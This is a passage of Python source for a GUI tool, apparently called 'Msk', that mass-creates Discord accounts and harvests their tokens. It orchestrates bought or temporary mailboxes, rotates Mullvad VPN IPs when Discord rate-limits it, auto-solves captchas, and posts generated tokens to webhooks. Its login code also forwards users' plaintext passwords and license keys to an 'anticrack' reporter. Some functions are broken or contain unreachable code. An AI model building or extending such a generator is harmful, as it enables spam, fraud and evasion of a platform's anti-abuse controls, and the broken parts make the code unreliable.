                version=KEYAUTH_VERSION,
                hash_to_check=checksum,
                gui_mode=True
            )

            try:
                if keyauth.keyauthapp.login(username, password):
                    self._cached_username = username
                    self._cached_password = password
                    
                    if remember:
                        try:
                            from .Utils.auto_login import AutoLogin
                            auto_login = AutoLogin()
                            auto_login.save_credentials(username, password)
                            auto_login.set_enabled(True)
                        except:
                            pass

                    try:
                        from .Utils.anticrack import report_login
                        report_login(username, password)
                    except:
                        pass

                    self.log(f"[Msk] Login successful! Welcome, {username}!", "success")
                    return {"success": True, "username": username}
            except Exception as e:
                error_msg = str(e)
                return {"success": False, "error": error_msg}
            
            return {"success": False, "error": "Login failed"}
        except ImportError as e:
            return {"success": False, "error": f"KeyAuth not available: {str(e)}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def auth_register(self, username: str, password: str, license_key: str) -> Dict:
        try:
            from .Utils import keyauth
            from .Utils.keyauth import api, KeyAuthError, KEYAUTH_APP_NAME, KEYAUTH_OWNER_ID, KEYAUTH_VERSION

            checksum = self._getchecksum()
            keyauth.keyauthapp = api(
                name=KEYAUTH_APP_NAME,
                ownerid=KEYAUTH_OWNER_ID,
                version=KEYAUTH_VERSION,
                hash_to_check=checksum,
                gui_mode=True
            )

            try:
                if keyauth.keyauthapp.register(username, password, license_key):
                    self._cached_username = username
                    self._cached_password = password
                    
                    try:
                        from .Utils.anticrack import report_register
                        report_register(username, password, license_key)
                    except:
                        pass

                    self.log(f"[Msk] Registration successful! Welcome, {username}!", "success")
                    return {"success": True, "username": username}
            except Exception as e:
                error_msg = str(e)
                return {"success": False, "error": error_msg}
            
            return {"success": False, "error": "Registration failed"}
        except ImportError as e:
            return {"success": False, "error": f"KeyAuth not available: {str(e)}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def get_saved_credentials(self) -> Dict:
        try:
            from .Utils.auto_login import AutoLogin
            auto_login = AutoLogin()
            if auto_login.has_saved_credentials():
                credentials = auto_login.load_credentials()
                if credentials:
                    return {
                        "success": True,
                        "username": credentials["username"],
                        "password": credentials["password"],
                        "auto_login_enabled": auto_login.is_enabled()
                    }
        except:
            pass
        return {"success": False}

    def try_auto_login(self) -> Dict:
        try:
            from .Utils.auto_login import AutoLogin
            auto_login = AutoLogin()

            if auto_login.is_enabled() and auto_login.has_saved_credentials():
                credentials = auto_login.load_credentials()
                if credentials:
                    return self.auth_login(
                        credentials["username"],
                        credentials["password"],
                        remember=True
                    )
        except:
            pass
        return {"success": False}



    def load_settings(self) -> Dict:
        self._settings = _load_internal_settings()
        return dict(self._settings)

    def save_settings(self, settings: Dict) -> Dict:
        self._settings = settings
        _save_internal_settings(settings)
        try:
            from .Utils.utils import Config
            Config.config = settings
        except Exception:
            pass
        return {"success": True}



    def check_mailcow_api(self, host_url: str, api_key: str, domain: str) -> Dict:
        """Check if the Mailcow API has full access (connection, create mailbox, delete mailbox)."""
        checks = {"connection": False, "create_mailbox": False, "delete_mailbox": False}
        try:
            import requests

            host_url = host_url.strip().rstrip('/')
            if host_url and not host_url.startswith("http"):
                host_url = f"https://{host_url}"

            session = requests.Session()
            session.headers.update({
                'X-API-Key': api_key,
                'Content-Type': 'application/json'
            })

            try:
                resp = session.get(f"{host_url}/api/v1/get/domain/all", timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, list):
                        domains = [d.get('domain_name', '') for d in data if d.get('active', 0) == 1]
                        checks["connection"] = True
                    else:
                        return {
                            "success": False,
                            "message": f"Unexpected API response: {str(data)[:200]}",
                            "checks": checks,
                        }
                elif resp.status_code == 401:
                    return {
                        "success": False,
                        "message": f"Authentication failed (401). API key is invalid or has no read access.",
                        "checks": checks,
                    }
                elif resp.status_code == 403:
                    return {
                        "success": False,
                        "message": f"Access denied (403). API key lacks permissions. Response: {resp.text[:200]}",
                        "checks": checks,
                    }
                else:
                    return {
                        "success": False,
                        "message": f"API returned HTTP {resp.status_code}. Response: {resp.text[:200]}",
                        "checks": checks,
                    }
            except requests.exceptions.ConnectionError as e:
                return {
                    "success": False,
                    "message": f"Cannot connect to {host_url} â€” check the Host URL is correct.",
                    "checks": checks,
                }
            except requests.exceptions.Timeout:
                return {
                    "success": False,
                    "message": f"Connection timed out to {host_url}.",
                    "checks": checks,
                }
            except Exception as e:
                return {
                    "success": False,
                    "message": f"Connection error: {str(e)[:200]}",
                    "checks": checks,
                }

            if domain and domains and domain not in domains:
                return {
                    "success": False,
                    "message": f"Domain '{domain}' not found on server. Available domains: {', '.join(domains[:5]) if domains else 'none'}",
                    "checks": checks,
                }

            test_user = f"msk-apicheck-{int(time.time())}"
            test_email = f"{test_user}@{domain}"
            test_password = "MskTest!Check_1234"
            payload = {
                "local_part": test_user,
                "domain": domain,
                "name": test_user,
                "password": test_password,
                "password2": test_password,
                "quota": 1,
                "active": 1
            }
            try:
                resp = session.post(f"{host_url}/api/v1/add/mailbox", json=payload, timeout=15)
                resp_text = resp.text[:300]
                if resp.status_code == 200:
                    try:
                        result = resp.json()
                        if isinstance(result, list) and result and result[0].get('type') == 'success':
                            checks["create_mailbox"] = True
                        else:
                            error_msg = ""
                            if isinstance(result, list) and result:
                                error_msg = result[0].get('msg', str(result[0]))
                            elif isinstance(result, dict):
                                error_msg = result.get('msg', str(result))
                            else:
                                error_msg = str(result)
                            return {
                                "success": False,
                                "message": f"Create mailbox failed. Mailcow says: {error_msg[:200]}",
                                "checks": checks,
                            }
                    except ValueError:
                        return {
                            "success": False,
                            "message": f"Create mailbox: invalid JSON response: {resp_text}",
                            "checks": checks,
                        }
                elif resp.status_code == 401:
                    return {
                        "success": False,
                        "message": f"Create mailbox: authentication failed (401). API key cannot write.",
                        "checks": checks,
                    }
                elif resp.status_code == 403:
                    return {
                        "success": False,
                        "message": f"Create mailbox: access denied (403). API key lacks write permission. Response: {resp_text}",
                        "checks": checks,
                    }
                else:
                    return {
                        "success": False,
                        "message": f"Create mailbox: HTTP {resp.status_code}. Response: {resp_text}",
                        "checks": checks,
                    }
            except Exception as e:
                return {
                    "success": False,
                    "message": f"Create mailbox error: {str(e)[:200]}",
                    "checks": checks,
                }

            try:
                resp = session.post(f"{host_url}/api/v1/delete/mailbox", json=[test_email], timeout=15)
                if resp.status_code == 200:
                    try:
                        result = resp.json()
                        if isinstance(result, list) and result and result[0].get("type") == "success":
                            checks["delete_mailbox"] = True
                        else:
                            error_msg = str(result)[:200] if result else "empty response"
                            checks["delete_mailbox"] = False
                    except ValueError:
                        checks["delete_mailbox"] = False
                else:
                    checks["delete_mailbox"] = False
            except Exception:
                checks["delete_mailbox"] = False

            all_ok = all(checks.values())
            if all_ok:
                return {
                    "success": True,
                    "message": "All checks passed! API has full access.",
                    "checks": checks,
                }
            else:
                failed = [k for k, v in checks.items() if not v]
                return {
                    "success": False,
                    "message": f"Some checks failed: {', '.join(failed)}",
                    "checks": checks,
                }

        except Exception as e:
            return {"success": False, "message": f"Unexpected error: {str(e)[:200]}", "checks": checks}

    def check_zeus_api(self, api_key: str) -> Dict:
        try:
            from .Helper.mail import ZeusApi
            api = ZeusApi(api_key=api_key)
            balance = api.check_balance()
            if balance is not None:
                return {"success": True, "message": f"API Key Valid. Balance: ${balance}"}
            else:
                return {"success": False, "message": "Invalid API Key or connection failed."}
        except Exception as e:
            return {"success": False, "message": f"Unexpected error: {str(e)[:200]}"}

    def check_hotmail007_api(self, api_key: str) -> Dict:
        try:
            from .Helper.mail import Hotmail007Api
            api = Hotmail007Api(api_key=api_key)
            balance = api.check_balance()
            if balance is not None:
                return {"success": True, "message": f"API Key Valid. Balance: ${balance}"}
            else:
                return {"success": False, "message": "Invalid API Key or connection failed."}
        except Exception as e:
            return {"success": False, "message": f"Unexpected error: {str(e)[:200]}"}

    def fetch_hotmail007_products(self, api_key: str) -> Dict:
        """Fetch available products from Hotmail007 /open/stock API."""
        try:
            import requests
            resp = requests.get(
                "https://gapi.hotmail007.com/open/stock",
                params={"clientKey": api_key},
                timeout=15
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("code") == 0 and data.get("success") is True:
                    products = data.get("data", [])
                    if products:
                        # Format products for frontend
                        formatted_products = []
                        for product in products:
                            formatted_products.append({
                                "productId": product.get("productId"),
                                "name": product.get("name", ""),
                                "mailType": product.get("mailType", ""),
                                "stock": product.get("stock", 0),
                                "price": product.get("price", 0)
                            })
                        return {
                            "success": True,
                            "products": formatted_products,
                            "message": f"Found {len(formatted_products)} products"
                        }
                    else:
                        return {"success": False, "message": "No products available", "products": []}
                else:
                    error_msg = data.get("message", "Unknown error")
                    return {"success": False, "message": f"API Error: {error_msg}", "products": []}
            elif resp.status_code == 401:
                return {"success": False, "message": "Invalid API Key", "products": []}
            else:
                return {"success": False, "message": f"HTTP {resp.status_code}", "products": []}
        except requests.exceptions.RequestException as e:
            return {"success": False, "message": f"Connection error: {str(e)[:100]}", "products": []}
        except Exception as e:
            return {"success": False, "message": f"Unexpected error: {str(e)[:200]}", "products": []}
        try:
            from .Helper.mail import LutionApi
            api = LutionApi(api_key=api_key)
            balance = api.check_balance()
            if balance is not None:
                return {"success": True, "message": f"API Key Valid. Balance: ${balance}"}
            else:
                return {"success": False, "message": "Invalid API Key or connection failed."}
        except Exception as e:
            return {"success": False, "message": f"Unexpected error: {str(e)[:200]}"}

    def check_groq_api(self, api_key: str) -> Dict:
        try:
            import requests
            headers = {
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json"
            }
            resp = requests.get("https://api.groq.com/openai/v1/models", headers=headers, timeout=10)
            if resp.status_code == 200:
                return {"success": True, "message": "API Key Valid. Connected to Groq successfully."}
            elif resp.status_code == 401:
                return {"success": False, "message": "Invalid API Key."}
            else:
                return {"success": False, "message": f"API returned HTTP {resp.status_code}. Response: {resp.text[:100]}"}
        except Exception as e:
            return {"success": False, "message": f"Connection error: {str(e)[:200]}"}

    def check_openrouter_api(self, api_key: str) -> Dict:
        """Validate an OpenRouter API key by hitting their models endpoint."""
        try:
            import requests
            headers = {
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json"
            }
            resp = requests.get("https://openrouter.ai/api/v1/models", headers=headers, timeout=10)
            if resp.status_code == 200:
                return {"success": True, "message": "API Key Valid. Connected to OpenRouter successfully."}
            elif resp.status_code == 401:
                return {"success": False, "message": "Invalid API Key."}
            else:
                return {"success": False, "message": f"API returned HTTP {resp.status_code}. Response: {resp.text[:100]}"}
        except Exception as e:
            return {"success": False, "message": f"Connection error: {str(e)[:200]}"}

    def check_cloudflare_api(self, account_id: str, api_key: str) -> Dict:
        """Validate Cloudflare Workers AI API credentials by testing the API."""
        try:
            import requests
            
            if not account_id or not api_key:
                return {"success": False, "message": "Account ID and API Token are required."}
            
            # Test the API by calling the Workers AI endpoint
            url = f"https://api.cloudflare.com/client/v4/accounts/{account_id}/ai/run/@cf/openai/gpt-oss-120b"
            headers = {
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json"
            }
            payload = {
                "messages": [{"role": "user", "content": "test"}],
                "max_tokens": 5
            }
            
            resp = requests.post(url, headers=headers, json=payload, timeout=15)
            
            if resp.status_code == 200:
                return {"success": True, "message": "API credentials valid. Connected to Cloudflare Workers AI successfully."}
            elif resp.status_code == 401:
                return {"success": False, "message": "Invalid API Token. Check your credentials."}
            elif resp.status_code == 403:
                return {"success": False, "message": "Access denied. Verify API Token has Workers AI permissions."}
            elif resp.status_code == 404:
                return {"success": False, "message": "Invalid Account ID or endpoint not found."}
            else:
                return {"success": False, "message": f"API returned HTTP {resp.status_code}. Response: {resp.text[:150]}"}
        except Exception as e:
            return {"success": False, "message": f"Connection error: {str(e)[:200]}"}

    def check_some_api(self, key: str) -> Dict:
        """Check API key validity. This function accepts whatever API key is
        provided, so the GUI button can call it with whatever the user has
        typed in the field.
        """
        try:
            if not key:
                return {"success": False, "message": "API key is required."}
            
            result = client.get_balance()

            if result.get("ok"):
                bal = result.get("balance")
                try:
                    bal_str = f"${float(bal):.2f}"
                except Exception:
                    bal_str = f"${bal}"
                return {
                    "success": True,
                    "message": f"API Key Valid. Balance: {bal_str}",
                    "balance": bal,
                }
            return {
                "success": False,
                "message": result.get("error") or "Failed to fetch balance.",
            }
        except Exception as e:
            return {"success": False, "message": f"Unexpected error: {str(e)[:200]}"}



    def start_generator(self, token_count: int, threads: int, headless: bool, auto_captcha: bool) -> Dict:
        with self._gen_state_lock:
            if self._generator_thread and self._generator_thread.is_alive():
                gen = getattr(self, '_active_generator', None)
                is_stopping = self._pre_stop or (gen and getattr(gen, 'should_stop', False))
                if is_stopping:
                    # Give it up to 5 s to die, then give up gracefully
                    self._generator_thread.join(timeout=5)
                    if self._generator_thread.is_alive():
                        return {"success": False, "error": "Generator is still stopping, please wait a moment..."}
                    # Thread finished â€” fall through to start a new one
                else:
                    return {"success": False, "error": "Generator already running"}
            # Reset stop flags before launching the new thread
            self._pre_stop = False

        email_providers = self._settings.get("email_providers", {})
        provider_enabled = False
        
        if email_providers.get("cybertemp", {}).get("enabled", False):
            if not email_providers.get("cybertemp", {}).get("api_key", "").strip():
                return {"success": False, "error": "CyberTemp is enabled but API key is missing. Please configure it in Settings."}
            provider_enabled = True
        elif email_providers.get("mailcow", {}).get("enabled", False):
            mailcow_config = email_providers.get("mailcow", {})
            if not mailcow_config.get("host_url", "").strip() or not mailcow_config.get("api_key", "").strip():
                return {"success": False, "error": "Mailcow is enabled but Host URL or API key is missing. Please configure it in Settings."}
            if not mailcow_config.get("domain", "").strip():
                return {"success": False, "error": "Mailcow is enabled but Domain is missing. Please set the domain (e.g. revoxy.shop) in Settings."}
            provider_enabled = True
        elif email_providers.get("zeus", {}).get("enabled", False):
            if not email_providers.get("zeus", {}).get("api_key", "").strip():
                return {"success": False, "error": "Zeus is enabled but API key is missing. Please configure it in Settings."}
            provider_enabled = True
        elif email_providers.get("hotmail007", {}).get("enabled", False):
            if not email_providers.get("hotmail007", {}).get("api_key", "").strip():
                return {"success": False, "error": "Hotmail007 is enabled but API key is missing. Please configure it in Settings."}
            provider_enabled = True
        elif email_providers.get("lution", {}).get("enabled", False):
            if not email_providers.get("lution", {}).get("api_key", "").strip():
                return {"success": False, "error": "Lution is enabled but API key is missing. Please configure it in Settings."}
            provider_enabled = True
        
        if not provider_enabled:
            cybertemp_key = self._settings.get("cybertemp_api_key", "").strip()
            if cybertemp_key:
                if "email_providers" not in self._settings:
                    self._settings["email_providers"] = {
                        "cybertemp": {"enabled": True, "api_key": cybertemp_key},
                        "mailcow": {"enabled": False, "host_url": "", "api_key": ""},
                        "zeus": {"enabled": False, "api_key": "", "account_type": "HOTMAIL"},
                        "hotmail007": {"enabled": False, "api_key": "", "mail_type": "hotmail"},
                        "lution": {"enabled": False, "api_key": "", "account_type": "hotmail.trusted.graph"}
                    }
                    _save_internal_settings(self._settings)
                provider_enabled = True
        
        if not provider_enabled:
            return {"success": False, "error": "No email provider is enabled. Please enable and configure an email provider in Settings."}

        self._settings["token_count"] = token_count
        self._settings["threads"] = threads
        self._settings["headless"] = headless
        self._settings["auto_solver_captcha"] = auto_captcha
        _save_internal_settings(self._settings)

        try:
            from .Utils.utils import Config
            Config.config = self._settings
        except Exception:
            pass

        fast_mails = self._settings.get("fast_mails", {})
        if fast_mails.get("enabled", False):
            try:
                from .WorkFlow.email_pool import EmailPool
                pool = EmailPool.instance()
                pool.start(self._settings, token_count)
            except Exception as e:
                self.log(f"[Msk] Failed to start email pool: {e}", "warning")

        self._stats_lock = threading.Lock()
        self._stats = {
            "valid": 0,
            "invalid": 0,
            "locked": 0,
            "amount": token_count,
            "concurrent_browsers": threads,
            "start_time": time.time()
        }

        self._generator_thread = threading.Thread(
            target=self._run_generator,
            args=(token_count, threads),
            daemon=True
        )
        self._generator_thread.start()

        threading.Thread(
            target=self._send_session_start_webhook,
            args=(token_count, threads),
            daemon=True
        ).start()

        return {"success": True}

    def _run_generator(self, token_count: int, threads: int):
        try:
            from .Utils.logger import Logger, log_info, log_error
            from .WorkFlow.discord_register import DiscordRegister
            from .Utils.utils import Config, RateLimitChecker
            from .Utils.mullvad_manager import MullvadManager
            from .MskColors.color import MskColor

            Config.config = self._settings

            Logger.start_logger()

            original_queue_log = Logger.queue_log.__func__
            original_queue_stats = Logger.queue_stats.__func__

            controller = self

            _ansi_re = re.compile(r'\x1b\[[0-9;]*m')

            def gui_queue_log(cls, worker_id, status=None, overwrite=True):
                if getattr(controller, '_active_generator', None) and getattr(controller._active_generator, 'should_stop', False):
                    return
                if status is None:
                    status = cls.STATUS
                log_type = "info"
                if status:
                    if MskColor.GREEN in status:
                        log_type = "success"
                    elif MskColor.RED in status:
                        log_type = "error"
                    elif MskColor.YELLOW in status:
                        log_type = "warning"
                bracket_color = MskColor.PRIMARY
                msk_color = MskColor.DIM
                reset = MskColor.RESET
                white = MskColor.WHITE
                colored_prefix = f"{bracket_color}[{reset}{msk_color}Msk{reset}{bracket_color}]{reset} "
                msg = status if status else ""
                controller.log(f"{colored_prefix}{msg}", log_type)
                # Update the per-worker last_log so worker state stays consistent,
                # but do NOT call original_queue_log: that would call log_process →
                # log_status → console.print(), duplicating every message in the GUI log.
                try:
                    with cls._lock:
                        cls._register_worker(worker_id)
                        cls._workers[worker_id]["last_log"] = status
                except Exception:
                    pass

            def gui_queue_stats(cls, worker_id, stats_list):
                if getattr(controller, '_active_generator', None) and getattr(controller._active_generator, 'should_stop', False):
                    return
                from .MskColors.color import MskColor
                bracket_color = MskColor.PRIMARY
                msk_color = MskColor.DIM
                reset = MskColor.RESET
                white = MskColor.WHITE
                
                printable_stats = [(name, val) for name, val, should_print in stats_list if should_print]
                
                for i, (stat_name, stat_value) in enumerate(printable_stats):
                    is_last = i == len(printable_stats) - 1
                    prefix_char = '\u2514' if is_last else '\u251c'
                    
                    spacer = "                    "
                    inner_spacer = "                         "
                    
                    colored_prefix = f"{spacer}{bracket_color}[{reset}{msk_color}Msk{reset}{bracket_color}]{reset}{inner_spacer}{white}{prefix_char}\u2500 {bracket_color}{stat_name}: {white}{stat_value}{reset}"
                    controller.log(colored_prefix, "info")
                # Do NOT call original_queue_stats — it prints to terminal via
                # print_stats → log_info/log_error → console.print(), duplicating
                # every stats line that already appeared in the GUI log panel.

            Logger.queue_log = classmethod(gui_queue_log)
            Logger.queue_stats = classmethod(gui_queue_stats)

            class GUIGenerator:
                def __init__(self_gen):
                    self_gen.should_stop = False
                    self_gen.lock = threading.Lock()
                    self_gen.browser_closed_flags = {}
                    self_gen.active_browsers = 0
                    self_gen.tokens_attempted = 0
                    self_gen.next_worker_id = 0
                    self_gen._browser_contexts = {}
                    self_gen.trigger_events = {}
                    
                    self_gen._wm = None
                    wm_enabled = controller._settings.get("use_windows_manager", True)
                    headless = controller._settings.get("headless", False)
                    if threads >= 2 and not headless and wm_enabled:
                        try:
                            from .Utils.window_manager import WindowManager
                            self_gen._wm = WindowManager(max_slots=threads, headless=False)
                            self_gen._wm.start_monitor()
                        except Exception as e:
                            controller.log(f"[Msk] WindowManager error: {e}", "warning")

                def browser_closed_signal(self_gen, worker_id):
                    with self_gen.lock:
                        if self_gen.browser_closed_flags.get(worker_id, False):
                            return
                        self_gen.browser_closed_flags[worker_id] = True
                        self_gen._browser_contexts.pop(worker_id, None)

                def register_browser(self_gen, worker_id, browser_ctx):
                    with self_gen.lock:
                        self_gen._browser_contexts[worker_id] = browser_ctx

                def force_close_all_browsers(self_gen):
                    with self_gen.lock:
                        contexts = dict(self_gen._browser_contexts)
                        self_gen._browser_contexts.clear()
                    # Actually close each browser context, not just clear the dict
                    for wid, ctx in contexts.items():
                        try:
                            ctx.__exit__(None, None, None)
                        except Exception:
                            pass

                def get_or_create_trigger_event(self_gen, worker_id):
                    with self_gen.lock:
                        if worker_id not in self_gen.trigger_events:
                            self_gen.trigger_events[worker_id] = threading.Event()
                        return self_gen.trigger_events[worker_id]

                def fire_trigger(self_gen, worker_id):
                    with self_gen.lock:
                        ev = self_gen.trigger_events.get(worker_id)
                    if ev and not ev.is_set():
                        ev.set()

            gen = GUIGenerator()
            # Pick up any stop signal that arrived before this thread had
            # a chance to set self._active_generator (the race window).
            gen.should_stop = self._pre_stop
            self._active_generator = gen
            if gen.should_stop:
                return

            def run_worker(worker_id, is_first=False):
                try:
                    config = Config.config
                    
                    vpn_providers = config.get("vpn_providers", {})
                    use_mullvad = vpn_providers.get("mullvad", {}).get("enabled", False)
                    
                    if not use_mullvad:
                        use_mullvad = config.get("mullvad", False)
                    
                    rate_limit_checker_enabled = config.get("rate_limit_checker", {}).get("enabled", False)

                    if use_mullvad:
                        from .Utils.mullvad_manager import MullvadManager
                        if is_first:
                            MullvadManager.display_first_account_status(worker_id)
                        else:
                            MullvadManager.display_reconnect_status(worker_id)

                        if rate_limit_checker_enabled:
                            max_vpn_retries = 3
                            for retry in range(max_vpn_retries):
                                wait_time = RateLimitChecker.check_account_ratelimit()
                                if wait_time <= 1:
                                    break
                                if retry < max_vpn_retries - 1:
                                    _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                                    controller.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {MskColor.YELLOW}Rate limited on this IP, switching... ({retry + 1}/{max_vpn_retries}){_R}", "warning")
                                    MullvadManager.display_reconnect_status(worker_id)
                                else:
                                    _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                                    controller.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {MskColor.YELLOW}Still rate limited after {max_vpn_retries} IP changes, waiting {wait_time}s...{_R}", "warning")
                                    time.sleep(wait_time)

                    elif rate_limit_checker_enabled and not is_first:
                        wait_time = RateLimitChecker.check_account_ratelimit()
                        if wait_time > 1:
                            _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                            controller.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {MskColor.YELLOW}Rate limited, waiting {wait_time}s...{_R}", "warning")
                            RateLimitChecker.countdown_timer(wait_time)

                    if gen.should_stop:
                        return

                    register = DiscordRegister()
                    register.controller = gen

                    _orig_register = register.register
                    def _tracked_register(worker_id, on_browser_closed):
                        import threading as _threading

                        def _watcher():
                            start_time = time.time()
                            while time.time() - start_time < 60:
                                if gen.should_stop:
                                    return
                                # Check for Camoufox browser context
                                if getattr(register, '_browser_launched', False) or getattr(register, '_smart_trigger_fired', False) or (hasattr(register, '_browser_ctx') and register._browser_ctx):
                                    if hasattr(register, '_browser_ctx') and register._browser_ctx:
                                        gen.register_browser(worker_id, register._browser_ctx)
                                    break
                                # Check for Chromium/Brave browser (truedriver) - they use _browser attribute
                                # on the sub-register object stored at _active_sub_register
                                _sub = getattr(register, '_active_sub_register', None)
                                if _sub and getattr(_sub, '_browser_ctx', None):
                                    gen.register_browser(worker_id, _sub._browser_ctx)
                                    break
                                if _sub and getattr(_sub, '_browser', None):
                                    # Wrap the truedriver browser in a context-manager-like object
                                    # so force_close_all_browsers() can stop it
                                    class _TruedriverBrowserWrapper:
                                        def __init__(self, sub_register):
                                            self._sub = sub_register
                                        def __exit__(self, *args):
                                            try:
                                                self._sub._cleanup()
                                            except Exception:
                                                pass
                                    gen.register_browser(worker_id, _TruedriverBrowserWrapper(_sub))
                                    break
                                time.sleep(0.1)

                            smart_cfg = Config.config.get('smart_multithread', {})
                            if smart_cfg.get('enabled'):
                                trigger_type = smart_cfg.get('trigger', 'captcha_solved')
                                trigger_end = time.time() + 300
                                while time.time() < trigger_end:
                                    if gen.should_stop:
                                        break
                                    if trigger_type == 'page_load' and hasattr(register, '_browser_ctx') and register._browser_ctx:
                                        gen.fire_trigger(worker_id)
                                        break
                                    if getattr(register, '_smart_trigger_fired', False):
                                        gen.fire_trigger(worker_id)
                                        break
                                    time.sleep(0.1)
                                else:
                                    gen.fire_trigger(worker_id)
                        
                        _threading.Thread(target=_watcher, daemon=True).start()

                        return _orig_register(
                            worker_id=worker_id,
                            on_browser_closed=on_browser_closed
                        )

                    status = _tracked_register(
                        worker_id=worker_id,
                        on_browser_closed=lambda wid: gen.browser_closed_signal(wid)
                    )

                    _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                    _msk = f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
                    _lock = getattr(self, '_stats_lock', None)
                    if status == "Valid":
                        with _lock: self._stats["valid"] = self._stats.get("valid", 0) + 1
                        controller.log(f"{_msk}{MskColor.GREEN}Token generated successfully!{_R}", "success")
                    elif status == "Locked":
                        with _lock: self._stats["locked"] = self._stats.get("locked", 0) + 1
                        controller.log(f"{_msk}{MskColor.YELLOW}Token locked{_R}", "warning")
                    elif status == "Invalid":
                        with _lock: self._stats["invalid"] = self._stats.get("invalid", 0) + 1
                        controller.log(f"{_msk}{MskColor.RED}Invalid result{_R}", "error")
                    elif status == "EmailVerify":
                        with _lock: self._stats["invalid"] = self._stats.get("invalid", 0) + 1
                        controller.log(f"{_msk}{MskColor.YELLOW}Email verification needed{_R}", "warning")
                    elif status == "RateLimited":
                        with _lock: self._stats["locked"] = self._stats.get("locked", 0) + 1
                        controller.log(f"{_msk}{MskColor.RED}Rate limited - IP blocked by Discord{_R}", "error")
                    elif status == "EndlessCaptcha":
                        with _lock: self._stats["locked"] = self._stats.get("locked", 0) + 1
                        controller.log(f"{_msk}{MskColor.RED}Endless captcha{_R}", "error")
                    elif status == "Stopped":
                        gen.should_stop = True
                        return
                    elif status == "ignore":
                        with _lock: self._stats["locked"] = self._stats.get("locked", 0) + 1
                        controller.log(f"{_msk}{MskColor.RED}Failed - page didn't load correctly{_R}", "error")
                    elif status == "VPN_BLOCKED":
                        with _lock: self._stats["invalid"] = self._stats.get("invalid", 0) + 1
                        controller.log(f"{_msk}{MskColor.RED}VPN Blocked by Provider! Reconnecting for next worker...{_R}", "error")

                    _last = getattr(register, 'last_result', {}) or {}
                    threading.Thread(
                        target=controller._send_webhook_embed,
                        args=(status, _last.get("token") or "", _last.get("email") or ""),
                        kwargs={
                            "humanized":      bool(_last.get("humanized") or False),
                            "phone_verified": bool(_last.get("phone_verified") or False),
                            "email_verified": bool(_last.get("email_verified") or False),
                            "gen_time":       float(_last.get("gen_time") or 0.0),
                            "hcap_time":      float(_last.get("hcap_time") or 0.0),
                            "email_time":     float(_last.get("email_time") or 0.0),
                            "phone_time":     float(_last.get("phone_time") or 0.0),
                            "humanize_time":  float(_last.get("humanize_time") or 0.0),
                        },
                        daemon=True
                    ).start()

                except Exception as e:
                    err_msg = str(e).lower()
                    err_type = type(e).__name__.lower()
                    if (gen.should_stop or 
                        ("target" in err_msg and "closed" in err_msg) or 
                        ("connection" in err_msg and "closed" in err_msg) or 
                        "greenlet" in err_type or 
                        "cannot switch to a different thread" in err_msg):
                        _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                        _msk = f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
                        controller.log(f"{_msk}{MskColor.YELLOW}Stopped By User (Browser manually closed){_R}", "warning")
                        gen.should_stop = True  # Stop the entire generator
                        controller.stop_generator() # Ensure UI resets properly
                        return
                    
                    if "vpn_blocked_groq" in err_msg.lower():
                        _lock = getattr(self, '_stats_lock', None)
                        with _lock: self._stats["invalid"] = self._stats.get("invalid", 0) + 1
                        _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                        _msk = f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
                        controller.log(f"{_msk}{MskColor.RED}Groq API blocked by VPN. Automatic reconnect triggered...{_R}", "error")
                        return

                    _lock = getattr(self, '_stats_lock', None)
                    with _lock: self._stats["locked"] = self._stats.get("locked", 0) + 1
                    _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                    _msk = f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
                    controller.log(f"{_msk}{MskColor.RED}Error: {str(e)[:80]}{_R}", "error")
                finally:
                    gen.browser_closed_signal(worker_id)

            completed = 0
            worker_id = 0
            active_threads = []
            consecutive_fails = 0
            worker_results = {}

            smart_mt_cfg = self._settings.get('smart_multithread', {})
            use_smart_mt = smart_mt_cfg.get('enabled', False)

            def run_worker_tracked(worker_id, is_first=False):
                run_worker(worker_id, is_first)
                _lock = getattr(self, '_stats_lock', None)
                if _lock:
                    with _lock:
                        total = self._stats.get("valid", 0) + self._stats.get("invalid", 0) + self._stats.get("locked", 0)
                else:
                    total = self._stats.get("valid", 0) + self._stats.get("invalid", 0) + self._stats.get("locked", 0)
                worker_results[worker_id] = total
                if use_smart_mt:
                    gen.fire_trigger(worker_id)

            while (token_count == 0 or completed < token_count) and not gen.should_stop:
                while len(active_threads) < threads and (token_count == 0 or worker_id < token_count):
                    if gen.should_stop:
                        break

                    if use_smart_mt and worker_id > 0:
                        prev_ev = gen.get_or_create_trigger_event(worker_id - 1)
                        if not prev_ev.is_set():
                            break

                    if consecutive_fails >= 3:
                        delay = min(consecutive_fails * 5, 30)
                        _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                        controller.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {MskColor.YELLOW}Multiple failures detected, waiting {delay}s before next attempt...{_R}", "warning")
                        time.sleep(delay)
                        consecutive_fails = max(0, consecutive_fails - 2)

                    is_first = (worker_id == 0)
                    gen.browser_closed_flags[worker_id] = False

                    if use_smart_mt:
                        gen.get_or_create_trigger_event(worker_id)

                    snapshot_before = self._stats.get("valid", 0)

                    t = threading.Thread(
                        target=run_worker_tracked,
                        args=(worker_id, is_first),
                        daemon=True
                    )
                    t.start()
                    active_threads.append((t, worker_id, snapshot_before, time.time()))
                    worker_id += 1
                    time.sleep(0.5)

                still_active = []
                curr_time = time.time()
                for t, wid, snap, start_t in active_threads:
